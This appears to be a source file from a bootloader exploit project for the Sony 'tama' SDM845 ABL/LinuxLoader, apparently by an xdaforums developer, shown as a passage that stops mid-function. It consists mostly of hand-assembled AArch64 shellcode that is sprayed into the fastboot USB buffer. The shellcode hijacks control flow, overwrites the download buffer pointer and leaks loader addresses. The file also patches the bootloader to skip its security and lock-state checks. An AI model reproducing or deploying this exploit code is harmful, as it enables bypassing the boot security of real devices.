// SPDX-License-Identifier: GPL-3.0-or-later
/*
 * target-p118.c - tama X_BOOT_SDM845_LA2_0_P_118 bootloader target specifics
 *
 * Copyright (C) 2025 j4nn at xdaforums
 */

static const int p118_offset = 0x2a7000; //0x3f7030; //0x400000;
static const int p118_size   = 0x400f90; //0x3fc030; //0x408000;

static const int64_t p118_test3_hitadj = -0x97ffecddLL + 0x322D8LL - 4LL;
static const int p118_stage1_cont = 0x32278;
static const char p118_test4_cmd[] = "flash:fb";


static void p118_setup_test2(unsigned char *buff, int size, int offset)
{
    int i;

    for (i = (offset % 0x80); i < size; i += 0x80) {
        OPCODE(buff + i + 0x00, 0x01, 0x00, 0x00, 0x94);        // bl     #0x04 = [ 01 00 00 94 ]
        OPCODE(buff + i + 0x04, 0xe2, 0xff, 0xff, 0x10);        // adr    x2, #-0x04 = [ e2 ff ff 10 ]
        OPCODE(buff + i + 0x08, 0xc2, 0x03, 0x02, 0xcb);        // sub    x2, lr, x2 = [ c2 03 02 cb ]
        OPCODE(buff + i + 0x0c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x10, 0xfd, 0xff, 0xff, 0x97);        // bl     #-0x0c = [ fd ff ff 97 ]
        OPCODE(buff + i + 0x14, 0xe0, 0xff, 0xb2, 0xd2);        // movz   x0, #0x97ff, lsl #16 = [ e0 ff b2 d2 ]    code "DD EC FF 97" is a call to return
        OPCODE(buff + i + 0x18, 0xa0, 0x9b, 0x9d, 0xf2);        // movk   x0, #0xecdd = [ a0 9b 9d f2 ]             fastboot FAIL response - search for it
        OPCODE(buff + i + 0x1c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x20, 0xf9, 0xff, 0xff, 0x97);        // bl     #-0x1c = [ f9 ff ff 97 ]
        OPCODE(buff + i + 0x24, 0xfe, 0xff, 0xff, 0xf0);        // adrp   lr, #-0x1000 = [ fe ff ff f0 ]
        OPCODE(buff + i + 0x28, 0xc1, 0x47, 0x40, 0xb8);        // ldr    w1, [lr], #4 = [ c1 47 40 b8 ]
        OPCODE(buff + i + 0x2c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x30, 0xf5, 0xff, 0xff, 0x97);        // bl     #-0x2c = [ f5 ff ff 97 ]
        OPCODE(buff + i + 0x34, 0x3f, 0x00, 0x00, 0x6b);        // cmp    w1, w0 = [ 3f 00 00 6b ]
        OPCODE(buff + i + 0x38, 0x81, 0xff, 0xff, 0x54);        // b.ne   #-0x10 = [ 81 ff ff 54 ]                  lr = 0x322DC, i.e. addr of code after
        OPCODE(buff + i + 0x3c, 0x06, 0x00, 0x00, 0x14);        // b      #0x18 = [ 06 00 00 14 ]                   the call to return fb FAIL response

        OPCODE(buff + i + 0x40, 0xf1, 0xff, 0xff, 0x97);        // bl     #-0x3c = [ f1 ff ff 97 ]
        snprintf(buff + i + 0x44, 5+7, "vxyz%06x-", i);         // "f3ce40-e40-" "vxyzf3ce40-"

        OPCODE(buff + i + 0x50, 0xed, 0xff, 0xff, 0x97);        // bl     #-0x4c = [ ed ff ff 97 ]
        OPCODE(buff + i + 0x54, 0xa0, 0xff, 0xff, 0x10);        // adr    x0, #-0x0c = [ a0 ff ff 10 ]
        OPCODE(buff + i + 0x58, 0x61, 0xff, 0xff, 0x10);        // adr    x1, #-0x14 = [ 61 ff ff 10 ]
        OPCODE(buff + i + 0x5c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x60, 0xe9, 0xff, 0xff, 0x97);        // bl     #-0x5c = [ e9 ff ff 97 ]
        OPCODE(buff + i + 0x64, 0x42, 0xfc, 0x44, 0xd3);        // lsr    x2, x2, #4 = [ 42 fc 44 d3 ]
        OPCODE(buff + i + 0x68, 0x21, 0x00, 0x02, 0x8b);        // add    x1, x1, x2 = [ 21 00 02 8b ]
        OPCODE(buff + i + 0x6c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x70, 0xe5, 0xff, 0xff, 0x97);        // bl     #-0x6c = [ e5 ff ff 97 ]
        OPCODE(buff + i + 0x74, 0x14, 0x89, 0x89, 0xd2);        // movz   x20, #0x4c48 = [ 14 89 89 d2 ]
        OPCODE(buff + i + 0x78, 0xd4, 0x03, 0x14, 0xcb);        // sub    x20, lr, x20 = [ d4 03 14 cb ]            x20 points to code to return our fb
        OPCODE(buff + i + 0x7c, 0x80, 0x02, 0x1f, 0xd6);        // br     x20 = [ 80 02 1f d6 ]                     response - link back to 0x322DC
    }
}


#if 0
static void p118_setup_test3(unsigned char *buff, int size, int offset)
{
    int i, j;

    memset(buff, 0, size);
    if (offset < 0)
        offset = size - 0x4000;

//    if (offset >= 0x40000)
//        for (j = offset - 0x40000; j < offset; j += 4)
//            OPCODE(buff + j, 0xc0, 0x03, 0x5f, 0xd6);           // ret = [ c0 03 5f d6 ]
    for (i = offset; i < size; i += 0x80) {
        for (j = 0; j < 0x4c; j += 4)
            OPCODE(buff + i + j, 0x1f, 0x20, 0x03, 0xd5);       // nop = [ 1f 20 03 d5 ]

        OPCODE(buff + i + 0x4c, 0xe2, 0xff, 0xb2, 0xd2);        // movz   x2, #0x97ff, lsl #16 = [ e2 ff b2 d2 ]    code "DD EC FF 97" is a call to return
        OPCODE(buff + i + 0x50, 0xa2, 0x9b, 0x9d, 0xf2);        // movk   x2, #0xecdd = [ a2 9b 9d f2 ]             fastboot FAIL response - search for it
        OPCODE(buff + i + 0x54, 0x63, 0xfd, 0xff, 0x10);        // adr    x3, #-0x54 = [ 63 fd ff 10 ]
        OPCODE(buff + i + 0x58, 0x61, 0x7c, 0x40, 0xb9);        // ldr    w1, [x3, #0x7c] = [ 61 7c 40 b9 ]         offset of current block vs offs string
        OPCODE(buff + i + 0x5c, 0x60, 0x00, 0x01, 0xcb);        // sub    x0, x3, x1 = [ 60 00 01 cb ]              addr of our resp. str. in usb buff
        OPCODE(buff + i + 0x60, 0x61, 0x4c, 0x40, 0xb8);        // ldr    w1, [x3, #0x04]! = [ 61 4c 40 b8 ]
        OPCODE(buff + i + 0x64, 0x3f, 0x00, 0x02, 0x6b);        // cmp    w1, w2 = [ 3f 00 02 6b ]
        OPCODE(buff + i + 0x68, 0xc1, 0xff, 0xff, 0x54);        // b.ne   #-0x08 = [ c1 ff ff 54 ]                  x3 = call to return fb FAIL (0x322D8)
        OPCODE(buff + i + 0x6c, 0xc1, 0x03, 0x03, 0xcb);        // sub    x1, lr, x3 = [ c1 03 03 cb ]
        OPCODE(buff + i + 0x70, 0x21, 0x00, 0x02, 0x8b);        // add    x1, x1, x2 = [ 21 00 02 8b ]
        OPCODE(buff + i + 0x74, 0x01, 0x70, 0x00, 0xf8);        // str    x1, [x0, #0x07] = [ 01 70 00 f8 ]
        OPCODE(buff + i + 0x78, 0x60, 0x00, 0x1f, 0xd6);        // br     x3 = [ 60 00 1f d6 ]                      jump back to 0x322D8
        *(uint32_t *)(buff + i + 0x7c) = i - (i / 0x80 * 16);

        snprintf(buff + (i / 0x80 * 16), 8, "%06x:", i);
    }
}

#else

static void p118_setup_test3(unsigned char *buff, int size, int offset)
{
    int i, j;

    memset(buff, 0, size);
    if (offset < 0)
        offset = size - 0x4000;

    *(uint64_t *)(buff + 0x1000) = 0x97ffecddULL | (0x97ffecddULL << 32); // code "DD EC FF 97" at 0x322D8 to return fastboot fail response
    *(uint64_t *)(buff + 0x1008) = 0x000fb000;                  // code boundary of LinuxLoader-p118.pe is 0x000fb000
    *(uint64_t *)(buff + 0x1010) = 0x000322D8;                  // address of code to return fastboot FAIL response
    *(uint64_t *)(buff + 0x1018) = 0x0010F768;                  // address of download mode usb buffer pointer

    int bs = 0x100;

    for (i = offset; i < size; i += bs) {
        snprintf(buff + (0x2000 + i / bs * 16), 8, "%06x:", i);

        OPCODE(buff + i + 0x00, 0x03, 0x00, 0x00, 0x10);        // adr    x3, #0x00 = [ 03 00 00 10 ]
        OPCODE(buff + i + 0x04, 0x61, 0x10, 0x43, 0x29);        // ldp    w1, w4, [x3, #0x18] = [ 61 10 43 29 ]     w1 == offset of current block vs offs string
        OPCODE(buff + i + 0x08, 0x64, 0x00, 0x04, 0xcb);        // sub    x4, x3, x4 = [ 64 00 04 cb ]              x4 == addr of buff + 0x1000
        OPCODE(buff + i + 0x0c, 0x82, 0x00, 0x40, 0xa9);        // ldp    x2, x0, [x4] = [ 82 00 40 a9 ]            w2 == code "DD EC FF 97" at 0x322D8
        OPCODE(buff + i + 0x10, 0x82, 0x00, 0x00, 0xb5);        // cbnz   x2, #0x10 = [ 82 00 00 b5 ]

        OPCODE(buff + i + 0x14, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            x0 == LinuxLoader code size to return
        //OPCODE(buff + i + 0x14, 0x00, 0x00, 0xc0, 0x14);        // b  #0x3000000 = [ 00 00 c0 14 ]]
        *(uint32_t *)(buff + i + 0x18) = i - (0x2000 + i / bs * 16);
        *(uint32_t *)(buff + i + 0x1c) = i - 0x1000;

        OPCODE(buff + i + 0x20, 0x60, 0x00, 0x01, 0xcb);        // sub    x0, x3, x1 = [ 60 00 01 cb ]              x0 == addr of our resp. str. in usb buff
        OPCODE(buff + i + 0x24, 0x61, 0x4c, 0x40, 0xb8);        // ldr    w1, [x3, #0x04]! = [ 61 4c 40 b8 ]
        OPCODE(buff + i + 0x28, 0x3f, 0x00, 0x02, 0x6b);        // cmp    w1, w2 = [ 3f 00 02 6b ]
        OPCODE(buff + i + 0x2c, 0xc1, 0xff, 0xff, 0x54);        // b.ne   #-0x08 = [ c1 ff ff 54 ]                  x3 = call to return fb FAIL (0x322D8)
        OPCODE(buff + i + 0x30, 0xc1, 0x03, 0x03, 0xcb);        // sub    x1, lr, x3 = [ c1 03 03 cb ]
        OPCODE(buff + i + 0x34, 0x21, 0x00, 0x02, 0x8b);        // add    x1, x1, x2 = [ 21 00 02 8b ]
        OPCODE(buff + i + 0x38, 0x01, 0x70, 0x00, 0xf8);        // str    x1, [x0, #0x07] = [ 01 70 00 f8 ]
        OPCODE(buff + i + 0x3c, 0x62, 0x00, 0x02, 0x8b);        // add    x2, x3, x2 = [ 62 00 02 8b ]
        OPCODE(buff + i + 0x40, 0x02, 0xf0, 0x00, 0xf8);        // str    x2, [x0, #0x0f] = [ 02 f0 00 f8 ]
        OPCODE(buff + i + 0x44, 0x9f, 0x00, 0x00, 0xf9);        // str    xzr, [x4] = [ 9f 00 00 f9 ]
        OPCODE(buff + i + 0x48, 0x82, 0x14, 0x41, 0xa9);        // ldp    x2, x5, [x4, #0x10] = [ 82 14 41 a9 ]
        OPCODE(buff + i + 0x4c, 0x62, 0x00, 0x02, 0xcb);        // sub    x2, x3, x2 = [ 62 00 02 cb ]
        OPCODE(buff + i + 0x50, 0x45, 0x00, 0x05, 0x8b);        // add    x5, x2, x5 = [ 45 00 05 8b ]
        OPCODE(buff + i + 0x54, 0xa2, 0x00, 0x00, 0xf9);        // str    x2, [x5] = [ a2 00 00 f9 ]
        OPCODE(buff + i + 0x58, 0x60, 0x00, 0x1f, 0xd6);        // br     x3 = [ 60 00 1f d6 ]                      jump back to 0x322D8

        if (i + bs + 0x5c < size) {
            for (j = 0x5c; j < bs; j += 4) {
                uint8_t b0 = (((bs - j) / 4) >> 0) & 0xff;
                uint8_t b1 = (((bs - j) / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0x00, 0x14);       // b      #(bs - j)
            }
        } else {
            for (j = 0x5c; j < bs; j += 4) {
                uint8_t b0 = ((-j / 4) >> 0) & 0xff;
                uint8_t b1 = ((-j / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0xff, 0x17);       // b      #(-j)
            }
        }
        //OPCODE(buff + i + 0x58, 0x00, 0x00, 0x00, 0x15);        // b      #0x4000000 = [ 00 00 00 15 ]
    }
}
#endif


static void p118_setup_test4(unsigned char *buff, int size, int offset, int payloadsize)
{
    int i;

    memset(buff, 0, 0x80);

    for (i = 0x80; i < size; i += 4)
            OPCODE(buff + i + 0x00, 0xc0, 0x03, 0x5f, 0xd6);    // ret = [ c0 03 5f d6 ]

    for (i = offset; i < size; i += 0x80) {
        OPCODE(buff + i + 0x00, 0x0a, 0x00, 0x00, 0x10);        // adr    x10, #0x00 = [ 0a 00 00 10 ]              x10 == buff
        OPCODE(buff + i + 0x04, 0x40, 0x75, 0x40, 0xb9);        // ldr    w0, [x10, #0x74] = [ 40 75 40 b9 ]        w14 == offset of exploit_continue, w0 == LinuxLoader code size
        OPCODE(buff + i + 0x08, 0x4e, 0x35, 0x4f, 0x29);        // ldp    w14, w13, [x10, #0x78] = [ 4e 35 4f 29 ]  w13 == offset of fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x0c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x10, 0xfc, 0xff, 0xff, 0x17);        // b      #-0x10 = [ fc ff ff 17 ]
        OPCODE(buff + i + 0x14, 0x7f, 0x00, 0x00, 0xeb);        // cmp    x3, x0 = [ 7f 00 00 eb ]                  check if called from alternate code path with size in x3
        OPCODE(buff + i + 0x18, 0x61, 0x00, 0x00, 0x54);        // b.ne   #0x0c = [ 61 00 00 54 ]                   if not.eq it is the first call of this code
        OPCODE(buff + i + 0x1c, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return not doing anything for the 2nd invokation of this

        OPCODE(buff + i + 0x20, 0xf8, 0xff, 0xff, 0x17);        // b      #-0x20 = [ f8 ff ff 17 ]
        OPCODE(buff + i + 0x24, 0x3f, 0x00, 0x08, 0x71);        // cmp    w1, #0x200 = [ 3f 00 08 71 ]              check if called from alternate code path as 1st invocation
        OPCODE(buff + i + 0x28, 0x81, 0x00, 0x00, 0x54);        // b.ne   #0x10 = [ 81 00 00 54 ]
        OPCODE(buff + i + 0x2c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x30, 0xf4, 0xff, 0xff, 0x17);        // b      #-0x30 = [ f4 ff ff 17 ]
        OPCODE(buff + i + 0x34, 0xde, 0xf3, 0x02, 0xd1);        // sub    lr, lr, #0xbc = [ de f3 02 d1 ]           called from alt code path 1st inv., adjust LR to &exploit_continue
        OPCODE(buff + i + 0x38, 0xce, 0x03, 0x0e, 0xcb);        // sub    x14, lr, x14 = [ ce 03 0e cb ]            x14 == LinuxLoader base addr
        OPCODE(buff + i + 0x3c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x40, 0xf0, 0xff, 0xff, 0x17);        // b      #-0x40 = [ f0 ff ff 17 ]
        OPCODE(buff + i + 0x44, 0xcc, 0x69, 0x6d, 0xf8);        // ldr    x12, [x14, x13] = [ cc 69 6d f8 ]         x12 = orig fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x48, 0xce, 0x69, 0x2d, 0xf8);        // str    x14, [x14, x13] = [ ce 69 2d f8 ]         fastboot_download_512MB_buffer_ptr = LinuxLoader base addr
        OPCODE(buff + i + 0x4c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x50, 0xec, 0xff, 0xff, 0x17);        // b      #-0x50 = [ ec ff ff 17 ]
        OPCODE(buff + i + 0x54, 0x2b, 0x22, 0xa2, 0x52);        // movz   w11, #0x1111, lsl #16 = [ 2b 22 a2 52 ]
        OPCODE(buff + i + 0x58, 0x2b, 0x22, 0x82, 0x72);        // movk   w11, #0x1111 = [ 2b 22 82 72 ]
        OPCODE(buff + i + 0x5c, 0x02, 0x00, 0x00, 0x14);        // b      #0x08 = [ 02 00 00 14 ]

        OPCODE(buff + i + 0x60, 0xe8, 0xff, 0xff, 0x17);        // b      #-0x60 = [ e8 ff ff 17 ]
        //OPCODE(buff + i + 0x64, 0x8f, 0x01, 0x0b, 0x8b);        // add    x15, x12, x11 = [ 8f 01 0b 8b ]           x15 == orig fastboot_download_512MB_buffer_ptr + 0x11111111
        OPCODE(buff + i + 0x64, 0xcf, 0x01, 0x0b, 0x8b);        // add    x15, x14, x11 = [ cf 01 0b 8b ]           x15 == LinuxLoader base addr + 0x11111111
        OPCODE(buff + i + 0x68, 0x6f, 0x32, 0x00, 0xa9);        // stp    x15, x12, [x19] = [ 6f 32 00 a9 ]         *hexlengthptr = x15;   *(hexlengthptr + 8) = x12
        OPCODE(buff + i + 0x6c, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return to &exploit_continue

        OPCODE(buff + i + 0x70, 0xe4, 0xff, 0xff, 0x17);        // b      #-0x70 = [ e4 ff ff 17 ]
        *(uint32_t *)(buff + i + 0x74) = payloadsize;           //                                                  size of code section of the LinuxLoader.pe
        *(uint32_t *)(buff + i + 0x78) = p118_stage1_cont;      //                                                  offset of exploit_continue
        *(uint32_t *)(buff + i + 0x7c) = 0x10F768;              //                                                  offset of fastboot_download_512MB_buffer_ptr
    }
}

static void p118_setup_test5_hitcode(unsigned char *buff, int pos, int jmpto)
{
    int i = pos;
    int j;

        OPCODE(buff + i + 0x00, 0x0a, 0x00, 0x00, 0x10);        // adr    x10, #0x00 = [ 0a 00 00 10 ]              x10 == buff + i + 0x00
        OPCODE(buff + i + 0x04, 0x4b, 0x5d, 0x40, 0xb9);        // ldr    w11, [x10, #0x5c] = [ 4b 5d 40 b9 ]       w11 == i - 0x400
        OPCODE(buff + i + 0x08, 0x4b, 0x01, 0x0b, 0xcb);        // sub    x11, x10, x11 = [ 4b 01 0b cb ]           x11 == buff + 0x400
        OPCODE(buff + i + 0x0c, 0xea, 0x03, 0x0b, 0xaa);        // mov    x10, x11 = [ ea 03 0b aa ]                x10 == buff + 0x400
        OPCODE(buff + i + 0x10, 0x60, 0x45, 0xc1, 0xa8);        // ldp    x0, x17, [x11], #0x10 = [ 60 45 c1 a8 ]   x0 == payloadsize, x17 == offset of usb download buff ptr
        OPCODE(buff + i + 0x14, 0x00, 0x02, 0x00, 0xb4);        // cbz    x0, #0x40 = [ 00 02 00 b4 ]               if x0 is zero jump to ret as we are already done

        OPCODE(buff + i + 0x18, 0x6c, 0x35, 0xc1, 0xa8);        // ldp    x12, x13, [x11], #0x10 = [ 6c 35 c1 a8 ]  w12 == 4 + offset of the call, w13 == the call instruction
        OPCODE(buff + i + 0x1c, 0x6e, 0x3d, 0xc1, 0xa8);        // ldp    x14, x15, [x11], #0x10 = [ 6e 3d c1 a8 ]  x14 == spadj, x15 == lradj

        //OPCODE(buff + i + 0x20, 0xac, 0x01, 0x00, 0xb4);        // cbz    x12, #0x34 = [ ac 01 00 b4 ]              if w12 == 0 skip this as it is unknown hit
        OPCODE(buff + i + 0x20, 0xcc, 0x01, 0x00, 0xb4);        // cbz    x12, #0x38 = [ cc 01 00 b4 ]              if w12 == 0 skip this as it is unknown hit

        OPCODE(buff + i + 0x24, 0xd0, 0xc3, 0x5f, 0xb8);        // ldr    w16, [lr, #-0x04] = [ d0 c3 5f b8 ]
        OPCODE(buff + i + 0x28, 0xbf, 0x01, 0x10, 0x6b);        // cmp    w13, w16 = [ bf 01 10 6b ]
        OPCODE(buff + i + 0x2c, 0x61, 0xff, 0xff, 0x54);        // b.ne   #-0x14 = [ 61 ff ff 54 ]

        OPCODE(buff + i + 0x30, 0x5f, 0x01, 0x00, 0xf9);        // str    xzr, [x10] = [ 5f 01 00 f9 ]              mark this as already done by setting payloadsize to zero
        OPCODE(buff + i + 0x34, 0xff, 0x63, 0x2e, 0x8b);        // add    sp, sp, x14 = [ ff 63 2e 8b ]
        OPCODE(buff + i + 0x38, 0xce, 0x03, 0x0c, 0xcb);        // sub    x14, lr, x12 = [ ce 03 0c cb ]            x14 == base address of the LinuxLoader
        OPCODE(buff + i + 0x3c, 0xde, 0x03, 0x0f, 0x8b);        // add    lr, lr, x15 = [ de 03 0f 8b ]

        OPCODE(buff + i + 0x40, 0xcc, 0x69, 0x71, 0xf8);        // ldr    x12, [x14, x17] = [ cc 69 71 f8 ]         x12 = orig fastboot_download_512MB_buffer_ptr
        OPCODE(buff + i + 0x44, 0xce, 0x69, 0x31, 0xf8);        // str    x14, [x14, x17] = [ ce 69 31 f8 ]         fastboot_download_512MB_buffer_ptr = LinuxLoader base addr
        OPCODE(buff + i + 0x48, 0x53, 0xdd, 0x0f, 0xd1);        // sub    x19, x10, #0x3f7 = [ 53 dd 0f d1 ]        x19 == buff + 9 == hexlengthptr, i.e. pointing after "download:"
        OPCODE(buff + i + 0x4c, 0x7e, 0x32, 0x00, 0xa9);        // stp    lr, x12, [x19] = [ 7e 32 00 a9 ]          *hexlengthptr = lr;   *(hexlengthptr + 8) = x12
        OPCODE(buff + i + 0x50, 0x94, 0x00, 0x80, 0xd2);        // mov    x20, #0x04 = [ 94 00 80 d2 ]
        OPCODE(buff + i + 0x54, 0xc0, 0x03, 0x5f, 0xd6);        // ret = [ c0 03 5f d6 ]                            return to &exploit_continue with restored x19 and x20

        OPCODE(buff + i + 0x58, 0x00, 0x00, 0x00, 0x15);        // b      #0x4000000 = [ 00 00 00 15 ]

        *(uint32_t *)(buff + i + 0x5c) = i - 0x400;             //                                                  offset of this code block to the base data block in buff

        if (jmpto > 0x60) {
            for (j = 0x60; j < jmpto; j += 4) {
                uint8_t b0 = (((jmpto - j) / 4) >> 0) & 0xff;
                uint8_t b1 = (((jmpto - j) / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0x00, 0x14);       // b      #(jmpto - j)
            }
        } else if (jmpto < 0) {
            jmpto = -jmpto;
            for (j = 0x60; j < jmpto; j += 4) {
                uint8_t b0 = ((-j / 4) >> 0) & 0xff;
                uint8_t b1 = ((-j / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0xff, 0x17);       // b      #(-j)
            }
        }
}

static void p118_setup_test5(unsigned char *buff, int size, int offset, int payloadsize)
{
    int i, j, idx;
    int bs = 0x1000;
    int shift = 0x0000;
    //int bs = 0x0400;
    //int shift = 0x03f8;

    memset(buff, 0, size);
//    for (i = 0x1000; i < size; i += 4) {
//        OPCODE(buff + i, 0xc0, 0x03, 0x5f, 0xd6);              // ret = [ c0 03 5f d6 ]
//    }

    *(uint64_t *)(buff + 0x400) = payloadsize;                 // size of code section of the LinuxLoader.pe
    *(uint64_t *)(buff + 0x408) = 0x0010F768;                  // address of download mode usb buffer pointer

    idx = 0x410;

#define HITENTRY(addr, becode, spadj, lradj) \
    do { \
        *(int64_t *)(buff + idx + 0x00) = (addr) + 4; \
        *(int64_t *)(buff + idx + 0x08) = __builtin_bswap32(becode); \
        *(int64_t *)(buff + idx + 0x10) = (spadj); \
        *(int64_t *)(buff + idx + 0x18) = (lradj); \
        idx += 0x20; \
    } while (0)

    HITENTRY(0x0050B0, 0x8FFCFF97, 0x0050, 0x2d1c4);            // 0x03235C [0x0050B0] -> 0x50C0
    HITENTRY(0x032274, 0x6152FF97, 0x0000, 0);                  // 0x032274 -> 0x6BF8
    HITENTRY(0x006CFC, 0xD5FBFF97, 0x0040, 0x2b578);            // 0x006CFC -> 0x5C50
    HITENTRY(0x006D48, 0x27FCFF97, 0x0040, 0x2b52c);            // 0x006D48 -> 0x5DE4
    HITENTRY(0x032330, 0x003FFF97, 0x0000, -0xbc);              // 0x032330 -> 0x1F30
    HITENTRY(0x000000, 0x00000000, 0x0000, 0);

    for (i = offset + shift; i < size; i += bs) {
        for (j = 0; j < bs; j += 4)
            OPCODE(buff + i + j, 0x00, 0x00, 0xc0, 0x14);       // b  #0x3000000 = [ 00 00 c0 14 ]]
        /*for (j = 0; j < 0xbf8; j += 4) {
                uint8_t b0 = (((0xbf8 - j) / 4) >> 0) & 0xff;
                uint8_t b1 = (((0xbf8 - j) / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0x00, 0x14);       // b      #(bs - j)
        }*/
        //p118_setup_test5_hitcode(buff, i + 0x0bf8, 0x0f30);     // 0x032274 -> 0x6BF8
        //p118_setup_test5_hitcode(buff, i + 0x0f30, 0x1bf8);     // 0x032330 -> 0x1F30
        //p118_setup_test5_hitcode(buff, i + 0x0000, 0x0000);     // 0x032274 -> 0x6BF8
        //p118_setup_test5_hitcode(buff, i + 0x0338, 0x0000);     // 0x032330 -> 0x1F30

        //p118_setup_test5_hitcode(buff, i + ((0x00c0 - shift) & (bs - 1)), 0x0000);     // 0x03235C [0x0050B0] -> 0x50C0
        p118_setup_test5_hitcode(buff, i + ((0x0bf8 - shift) & (bs - 1)), 0x0000);     // 0x032274 -> 0x6BF8
        //p118_setup_test5_hitcode(buff, i + ((0x0c50 - shift) & (bs - 1)), 0x0000);     // 0x006CFC -> 0x5C50   !!needs hitcode size max 0x58 to fit after 0x0bf8, partial cache of hex2uint64 with "download:0"!!
        p118_setup_test5_hitcode(buff, i + ((0x0de4 - shift) & (bs - 1)), 0x0000);     // 0x006D48 -> 0x5DE4
        p118_setup_test5_hitcode(buff, i + ((0x0f30 - shift) & (bs - 1)), 0x0000);     // 0x032330 -> 0x1F30
        //OPCODE(buff + i + ((0x0f58 - shift) & (bs - 1)), 0xc0, 0x03, 0x5f, 0xd6);      // 0x0070D0 -> 0x6F88   ret = [ c0 03 5f d6 ]

#if 0
        if (i + bs + 0x60 < size) {
            for (j = 0x60; j < bs; j += 4) {
                uint8_t b0 = (((bs - j) / 4) >> 0) & 0xff;
                uint8_t b1 = (((bs - j) / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0x00, 0x14);       // b      #(bs - j)
            }
        } else {
            for (j = 0x60; j < bs; j += 4) {
                uint8_t b0 = ((-j / 4) >> 0) & 0xff;
                uint8_t b1 = ((-j / 4) >> 8) & 0xff;
                OPCODE(buff + i + j, b0, b1, 0xff, 0x17);       // b      #(-j)
            }
        }
#endif
    }
}

static void p118_test8_patch(unsigned char *ablcode, int size, int offset);

static void p118_patch_abl(unsigned char *ablcode, int extended)
{
        OPCODE(ablcode + 0x2FA98 + 0x00, 0x0c, 0x00, 0x00, 0x14);  // b     #0x30 = [ 0c 00 00 14 ]                 skip some static code checks in favor of our code (0x2FA9C..0x2FAC4+4)
        //OPCODE(ablcode + 0x2FAC4 + 0x00, 0x1f, 0x20, 0x03, 0xd5);  // nop = [ 1f 20 03 d5 ]                         skip "Flashing is not allowed in Lock State" error
        OPCODE(ablcode + 0x2FB08 + 0x00, 0x61, 0x02, 0x00, 0x54);  // b.ne  #0x4c = [ 61 02 00 54 ]                 skip few more checks in favor of our code (0x2FB0C..0x2FB50+4 available)

        // exploit_2nd_phase_start: first invalidate ABL LinuxLoader code range
        // this is triggered by "flash:fb" command that would normally result with "No such partition." error
        OPCODE(ablcode + 0x2FB0C + 0x00, 0x80, 0xfe, 0xff, 0xb0);  // adrp  x0, #-0x2f000 = [ 80 fe ff b0 ]
        OPCODE(ablcode + 0x2FB0C + 0x04, 0x01, 0xec, 0x43, 0x91);  // add   x1, x0, #0x000fb000 = [ 01 ec 43 91 ]   Code boundary of LinuxLoader-p118.pe is 0x000fb000
        OPCODE(ablcode + 0x2FB0C + 0x08, 0x20, 0x7e, 0x0b, 0xd5);  // dc    civac, x0 = [ 20 7e 0b d5 ]
        OPCODE(ablcode + 0x2FB0C + 0x0c, 0x9f, 0x3f, 0x03, 0xd5);  // dsb   sy = [ 9f 3f 03 d5 ]

        //OPCODE(ablcode + 0x2FB0C + 0x10, 0x00, 0x80, 0x00, 0x91);  // add   x0, x0, #0x20 = [ 00 80 00 91 ]
        OPCODE(ablcode + 0x2FB0C + 0x10, 0x00, 0x10, 0x00, 0x91);  // add   x0, x0, #0x04 = [ 00 10 00 91 ]

        OPCODE(ablcode + 0x2FB0C + 0x14, 0x1f, 0x00, 0x01, 0xeb);  // cmp   x0, x1 = [ 1f 00 01 eb ]
        OPCODE(ablcode + 0x2FB0C + 0x18, 0x8b, 0xff, 0xff, 0x54);  // b.lt  #-0x10 = [ 8b ff ff 54 ]
        OPCODE(ablcode + 0x2FB0C + 0x1c, 0x1f, 0x75, 0x08, 0xd5);  // ic    iallu = [ 1f 75 08 d5 ]
        OPCODE(ablcode + 0x2FB0C + 0x20, 0xdf, 0x3f, 0x03, 0xd5);  // isb         = [ df 3f 03 d5 ]

        // restore original value of fastboot_download_512MB_buffer_ptr stored previously into "usb command buffer + 0x11" (x19 now points after "flash:" cmd, i.e. 0x06+0x0b=0x11)
        OPCODE(ablcode + 0x2FB0C + 0x24, 0x64, 0xb2, 0x40, 0xf8);  // ldr   x4, [x19, #0x0b] = [ 64 b2 40 f8 ]      orig fastboot_download_512MB_buffer_ptr

        OPCODE(ablcode + 0x2FB0C + 0x28, 0x02, 0x07, 0x00, 0x90);  // adrp  x2, #0xe0000 = [ 02 07 00 90 ]          fastboot_download_512MB_buffer_ptr@PAGE  (0x10F768)
        OPCODE(ablcode + 0x2FB0C + 0x2c, 0x42, 0xa0, 0x1d, 0x91);  // add   x2, x2, #0x768 = [ 42 a0 1d 91 ]        fastboot_download_512MB_buffer_ptr@POFF  (0x10F768)
        OPCODE(ablcode + 0x2FB0C + 0x30, 0x44, 0x04, 0x00, 0xf9);  // str   x4, [x2, #0x08] = [ 44 04 00 f9 ]       restore orig fastboot_download_512MB_buffer_ptr


        // send base addr of LinuxLoader as hex string after the FAIL fastboot response
        // and also address of usb command buffer that can overflow
        // .text:00000000000C2867 DCB "%x/%x",0xA,0
